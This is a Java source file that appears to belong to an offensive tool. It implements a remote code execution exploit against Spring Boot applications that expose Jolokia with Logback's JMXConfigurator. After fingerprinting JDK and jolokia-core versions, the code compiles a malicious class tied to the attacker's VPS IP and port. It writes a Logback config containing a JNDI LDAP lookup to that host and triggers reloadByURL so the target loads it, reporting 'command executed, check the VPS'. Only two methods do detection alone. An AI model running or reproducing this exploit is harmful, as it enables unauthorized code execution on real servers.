package src.main.module;

import src.main.common.HTTPConfig;
import src.main.loadlib.ClassCom.ClsComp;
import src.main.common.VersionComparator;
import src.main.impl.ResultCallback;

import java.io.BufferedReader;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.util.Scanner;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import static src.main.ssl.sslVer.disableSSLVerification;

public class JolokiaLogbackRCE {
    private String address;
    public  String text;
    private String vpsIP;
    private String vpsPort;
    private boolean isPoc;
    public String jndipayload = "<configuration>\n" +
            "    <insertFromJNDI env-entry-name=\"ldap://%s:1389/JolokiaLogback\" as=\"appName\" />\n" +
            "</configuration>";
    public String payloadURL = "/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/%s!/JolokiaLogback.xml";
    public JolokiaLogbackRCE(String address, String vpsIP, String vpsPort,boolean isPoc){
        this.address = address;
        this.vpsIP = vpsIP;
        this.vpsPort = vpsPort;
        this.isPoc = isPoc;
    }

    public void Result1(ResultCallback callback) {
        String llib = "jdk";
        String llib1 = "jolokia-core";
        String api = "/jolokia";
        String site = address + "/env";
        String logbak = "ch.qos.logback.classic.jmx.JMXConfigurator";
        String reloURL = "reloadByURL";
        String data = "";
        disableSSLVerification();
        try {
            HttpURLConnection conn = HTTPConfig.createConnection(site);
            conn.setRequestMethod("GET");
            conn.setDoOutput(true);
            int responseCode = conn.getResponseCode();
            BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            String inputLine;
            StringBuilder response = new StringBuilder();
            while ((inputLine = in.readLine()) != null) {
                response.append(inputLine);
            }
            if (responseCode == HttpURLConnection.HTTP_OK && response.toString().contains(llib) && response.toString().contains(llib1)){
                String regex = llib+ "(\\d+\\.\\d+\\.\\d+_\\d+)";
                Pattern pattern = Pattern.compile(regex);
                Matcher matcher = pattern.matcher(response.toString());
                String regex1 = llib1+ "-(\\d+\\.\\d+\\.\\d)";
                Pattern pattern1 = Pattern.compile(regex1);
                Matcher matcher1 = pattern1.matcher(response.toString());
                if (matcher.find() && matcher1.find()) {
                    text = "当前jdk版本为: " + matcher.group(1);
                    callback.onResult(text);
                    text = "当前jolokia-core版本为: " + matcher1.group(1);
                    callback.onResult(text);
                    HttpURLConnection conn1 = HTTPConfig.createConnection(address +  api + "/list");
                    conn1.setRequestMethod("GET");
                    conn1.setDoOutput(true);
                    int responseCode1 = conn1.getResponseCode();
                    BufferedReader in1 = new BufferedReader(new InputStreamReader(conn1.getInputStream()));
                    String inputLine1;
                    StringBuilder response1 = new StringBuilder();
                    while ((inputLine1 = in1.readLine()) != null) {
                        response1.append(inputLine1);
                    }
                    if (responseCode1 == HttpURLConnection.HTTP_OK && (response1.toString().contains(logbak)) && response1.toString().contains(reloURL)) {
                        text = "存在 ch.qos.logback.classic.jmx.JMXConfigurator 和 reloadByURL";
                        callback.onResult(text);
                        ClsComp cc = new ClsComp(vpsIP,vpsPort);
                        boolean isModify = cc.modifyJavaClassFile("JNDIObject/JolokiaLogbackTemplate.java","JolokiaLogback.java",callback);
                        if (isModify) {
                            try {
                                cc.CompileJava("JolokiaLogback", "JolokiaLogback", callback);
                            } catch (IOException e) {
                                return;
                            }
                            text = "class文件写入成功";
                            FileWriter writer1 = new FileWriter(System.getProperty("user.dir") + "/resources/JolokiaLogback.xml");
                            Scanner sc = new Scanner(System.in);
                            data = String.format(jndipayload, vpsIP);
                            writer1.write(data);
                            sc.close();
                            writer1.close();
                            text = "JolokiaLogback.xml文件写入成功";
                            callback.onResult(text);
                            String urltmp = String.format(payloadURL,vpsIP);
                            HttpURLConnection conn2 = HTTPConfig.createConnection(address + urltmp);
                            conn2.setRequestMethod("GET");
                            conn2.setReadTimeout(2000);    // 设置读取超时
                            conn2.setDoOutput(true);// 设置读取超时
                            try {
                                System.out.println("这个漏洞发送payload服务器会超时，忽略异常，状态码: " + conn2.getResponseCode());
                            } catch (java.net.SocketTimeoutException e) {
                                text = "命令执行成功，请在vps上查看信息";
                                callback.onResult(text);
                                text = "当前监听vpsIP： " + vpsIP + " " + "vpsPort: " + vpsPort;
                                callback.onResult(text);
                            }
                        }else{
                            text = "写入文件失败";
                            callback.onResult(text);
                        }
                    }else{
                        text = "未找到 ch.qos.logback.classic.jmx.JMXConfigurator 和 reloadByURL";
                        callback.onResult(text);
                    }
                }else{
                    text = "未找到依赖";
                    callback.onResult(text);
                }
            }else {
                text = "发起请求失败";
                callback.onResult(text);
            }
        }catch (Exception e){
            text = "检测依赖异常";
            callback.onResult(text);
            e.printStackTrace();
        }
    }
    public void Result2(ResultCallback callback) {
        String llib = "jdk";
        String llib1 = "jolokia-core";
        String api = "/actuator/jolokia";
        String site = address + "/actuator/env";
        String logbak = "ch.qos.logback.classic.jmx.JMXConfigurator";
        String reloURL = "reloadByURL";
        String data = "";
        disableSSLVerification();
        try {
            HttpURLConnection conn = HTTPConfig.createConnection(site);
            conn.setRequestMethod("GET");
            conn.setDoOutput(true);
            int responseCode = conn.getResponseCode();
            BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            String inputLine;
            StringBuilder response = new StringBuilder();
            while ((inputLine = in.readLine()) != null) {
                response.append(inputLine);
            }
            if (responseCode == HttpURLConnection.HTTP_OK && response.toString().contains(llib) && response.toString().contains(llib1)){
                String regex = llib+ "(\\d+\\.\\d+\\.\\d+_\\d+)";
                Pattern pattern = Pattern.compile(regex);
                Matcher matcher = pattern.matcher(response.toString());
                String regex1 = llib1+ "-(\\d+\\.\\d+\\.\\d)";
                Pattern pattern1 = Pattern.compile(regex1);
                Matcher matcher1 = pattern1.matcher(response.toString());
                if (matcher.find() && matcher1.find()) {
                    text = "当前jdk版本为: " + matcher.group(1);
                    callback.onResult(text);
                    text = "当前jolokia-core版本为: " + matcher1.group(1);
                    callback.onResult(text);
                    HttpURLConnection conn1 = HTTPConfig.createConnection(address +  api + "/list");
                    conn1.setRequestMethod("GET");
                    conn1.setDoOutput(true);
                    int responseCode1 = conn1.getResponseCode();
                    BufferedReader in1 = new BufferedReader(new InputStreamReader(conn1.getInputStream()));
                    String inputLine1;
                    StringBuilder response1 = new StringBuilder();
                    while ((inputLine1 = in1.readLine()) != null) {
                        response1.append(inputLine1);
                    }
                    if (responseCode1 == HttpURLConnection.HTTP_OK && (response1.toString().contains(logbak)) && response1.toString().contains(reloURL)) {
                        text = "存在 ch.qos.logback.classic.jmx.JMXConfigurator 和 reloadByURL";
                        callback.onResult(text);
                        ClsComp cc = new ClsComp(vpsIP,vpsPort);
                        boolean isModify = cc.modifyJavaClassFile("JNDIObject/JolokiaLogbackTemplate.java","JolokiaLogback.java",callback);
                        if (isModify) {
                            try {
                                cc.CompileJava("JolokiaLogback", "JolokiaLogback", callback);
                            } catch (IOException e) {
                                return;
                            }
                            text = "class文件写入成功";
                            FileWriter writer1 = new FileWriter(System.getProperty("user.dir") + "/resources/JolokiaLogback.xml");
                            Scanner sc = new Scanner(System.in);
                            data = String.format(jndipayload, vpsIP);
                            writer1.write(data);
                            sc.close();
                            writer1.close();
                            text = "JolokiaLogback.xml文件写入成功";
                            callback.onResult(text);
                            String urltmp = String.format(payloadURL,vpsIP);
                            HttpURLConnection conn2 = HTTPConfig.createConnection(address + urltmp);
                            conn2.setRequestMethod("GET");
                            conn2.setReadTimeout(2000);    // 设置读取超时
                            conn2.setDoOutput(true);// 设置读取超时
                            try {
                                System.out.println("这个漏洞发送payload服务器会超时，忽略异常，状态码: " + conn2.getResponseCode());
                            } catch (java.net.SocketTimeoutException e) {
                                text = "命令执行成功，请在vps上查看信息";
                                callback.onResult(text);
                                text = "当前监听vpsIP： " + vpsIP + " " + "vpsPort: " + vpsPort;
                                callback.onResult(text);
                            }
                        }
                    }else{
                        text = "未找到 ch.qos.logback.classic.jmx.JMXConfigurator 和 reloadByURL";
                        callback.onResult(text);
                    }
                }else{
                    text = "未找到依赖";
                    callback.onResult(text);
                }
            }else {
                text = "发起请求失败";
                callback.onResult(text);
            }
        }catch (Exception e){
            text = "检测依赖异常";
            callback.onResult(text);
            e.printStackTrace();
        }
    }
    public void Result3(ResultCallback callback){
        String llib = "jdk";
        String llib1 = "jolokia-core";
        String api = "/jolokia";
        String site = address + "/env";
        String logbak = "ch.qos.logback.classic.jmx.JMXConfigurator";
        String reloURL = "reloadByURL";
        disableSSLVerification();
        try {
            HttpURLConnection conn = HTTPConfig.createConnection(site);
            conn.setRequestMethod("GET");
            conn.setDoOutput(true);
            int responseCode = conn.getResponseCode();
            BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            String inputLine;
            StringBuilder response = new StringBuilder();
            while ((inputLine = in.readLine()) != null) {
                response.append(inputLine);
            }
            if (responseCode == HttpURLConnection.HTTP_OK && response.toString().contains(llib) && response.toString().contains(llib1)) {
                String regex = llib + "(\\d+\\.\\d+\\.\\d+_\\d+)";
                Pattern pattern = Pattern.compile(regex);
                Matcher matcher = pattern.matcher(response.toString());
                String regex1 = llib1 + "-(\\d+\\.\\d+\\.\\d)";
                Pattern pattern1 = Pattern.compile(regex1);
                Matcher matcher1 = pattern1.matcher(response.toString());
                if (matcher.find() && matcher1.find()) {
                    text = "当前jdk版本为: " + matcher.group(1);
                    callback.onResult(text);
                    text = "当前jolokia-core版本为: " + matcher1.group(1);
                    callback.onResult(text);
                    HttpURLConnection conn1 = HTTPConfig.createConnection(address + api + "/list");
                    conn1.setRequestMethod("GET");
                    conn1.setDoOutput(true);
                    int responseCode1 = conn1.getResponseCode();
                    BufferedReader in1 = new BufferedReader(new InputStreamReader(conn1.getInputStream()));
                    String inputLine1;
                    StringBuilder response1 = new StringBuilder();
                    while ((inputLine1 = in1.readLine()) != null) {
                        response1.append(inputLine1);
                    }
                    if (responseCode1 == HttpURLConnection.HTTP_OK && (response1.toString().contains(logbak)) && response1.toString().contains(reloURL)) {
                        text = "存在 ch.qos.logback.classic.jmx.JMXConfigurator 和 reloadByURL";
                        callback.onResult(text);
                    }
                    if (
                                    VersionComparator.isVersionAtLeast(matcher.group(1),"11.0.1") ||
                                    VersionComparator.isVersionAtLeast(matcher.group(1),"8u182") ||
                                    VersionComparator.isVersionAtLeast(matcher.group(1),"7u191") ||
                                    VersionComparator.isVersionAtLeast(matcher.group(1),"6u201")
                    ){
                            text = "可能存在漏洞";
                            callback.onResult(text);
                    }else {
                        text = "不存在可利用漏洞";
                        callback.onResult(text);
                    }
                }
            }
        }catch (Exception e) {
            text = "检测依赖异常";
            callback.onResult(text);
            e.printStackTrace();
        }
    }
    public void Result4(ResultCallback callback){
        String llib = "jdk";
        String llib1 = "jolokia-core";
        String api = "/actuator/jolokia";
        String site = address + "/actuator/env";
        String logbak = "ch.qos.logback.classic.jmx.JMXConfigurator";
        String reloURL = "reloadByURL";
        disableSSLVerification();
        try {
            HttpURLConnection conn = HTTPConfig.createConnection(site);
            conn.setRequestMethod("GET");
            conn.setDoOutput(true);
            int responseCode = conn.getResponseCode();
            BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            String inputLine;
            StringBuilder response = new StringBuilder();
            while ((inputLine = in.readLine()) != null) {
                response.append(inputLine);
            }
            if (responseCode == HttpURLConnection.HTTP_OK && response.toString().contains(llib) && response.toString().contains(llib1)) {
                String regex = llib + "(\\d+\\.\\d+\\.\\d+_\\d+)";
                Pattern pattern = Pattern.compile(regex);
                Matcher matcher = pattern.matcher(response.toString());
                String regex1 = llib1 + "-(\\d+\\.\\d+\\.\\d)";
                Pattern pattern1 = Pattern.compile(regex1);
                Matcher matcher1 = pattern1.matcher(response.toString());
                if (matcher.find() && matcher1.find()) {
                    text = "当前jdk版本为: " + matcher.group(1);
                    callback.onResult(text);
                    text = "当前jolokia-core版本为: " + matcher1.group(1);
                    callback.onResult(text);
                    HttpURLConnection conn1 = HTTPConfig.createConnection(address + api + "/list");
                    conn1.setRequestMethod("GET");
                    conn1.setDoOutput(true);
                    int responseCode1 = conn1.getResponseCode();
                    BufferedReader in1 = new BufferedReader(new InputStreamReader(conn1.getInputStream()));
                    String inputLine1;
                    StringBuilder response1 = new StringBuilder();
                    while ((inputLine1 = in1.readLine()) != null) {
                        response1.append(inputLine1);
                    }
                    if (responseCode1 == HttpURLConnection.HTTP_OK && (response1.toString().contains(logbak)) && response1.toString().contains(reloURL)) {
                        text = "存在 ch.qos.logback.classic.jmx.JMXConfigurator 和 reloadByURL";
                        callback.onResult(text);
                    }
                    if (
                            VersionComparator.isVersionAtLeast(matcher.group(1),"11.0.1") ||
                                    VersionComparator.isVersionAtLeast(matcher.group(1),"8u182") ||
                                    VersionComparator.isVersionAtLeast(matcher.group(1),"7u191") ||
                                    VersionComparator.isVersionAtLeast(matcher.group(1),"6u201")
                    ){
                        HttpURLConnection conn2 = HTTPConfig.createConnection(address + "/actuator");
                        conn2.setDoOutput(true);
                        conn2.setRequestMethod("GET");
                        int responseCode2 = conn2.getResponseCode();
                        BufferedReader in2 = new BufferedReader(new InputStreamReader(conn2.getInputStream()));
                        String inputLine2;
                        StringBuilder response2 = new StringBuilder();
                        while ((inputLine2 = in2.readLine()) != null) {
                            response2.append(inputLine2);
                        }
                        in2.close();
                        if (responseCode2 == HttpURLConnection.HTTP_OK) {
                            text = "可能存在漏洞";
                            callback.onResult(text);
                        }else {
                            text = "不存在可利用漏洞";
                            callback.onResult(text);
                        }
                    }else {
                        text = "不存在可利用漏洞";
                        callback.onResult(text);
                    }
                }
            }
        }catch (Exception e) {
            text = "检测依赖异常";
            callback.onResult(text);
            e.printStackTrace();
        }
    }
    public void Exp(ResultCallback callback){
        String api = "/actuator/env";
        String site = address + api;
        disableSSLVerification();
        try{
            HttpURLConnection conn = HTTPConfig.createConnection(site);
            conn.setRequestMethod("GET");
            int responseCode = conn.getResponseCode();
            if (responseCode == HttpURLConnection.HTTP_OK) {
                text = "当前版本为springboot2";
                callback.onResult(text);
                if (isPoc && vpsPort.isEmpty() && vpsIP.isEmpty()){
                    Result4(callback);
                }else {
                    Result2(callback);
                }
            }else if (responseCode == HttpURLConnection.HTTP_NOT_FOUND){
                text = "当前版本为springboot1";
                callback.onResult("当前版本为springboot1");
                if (isPoc && vpsPort.isEmpty() && vpsIP.isEmpty()){
                    Result3(callback);
                }else {
                    Result1(callback);
                }
            }else{
                text = "未识别springboot版本";
                callback.onResult(text);
            }
        }catch (Exception e){
            text = "检测springboot版本异常";
            callback.onResult(text);
            e.printStackTrace();
        }
    }
}
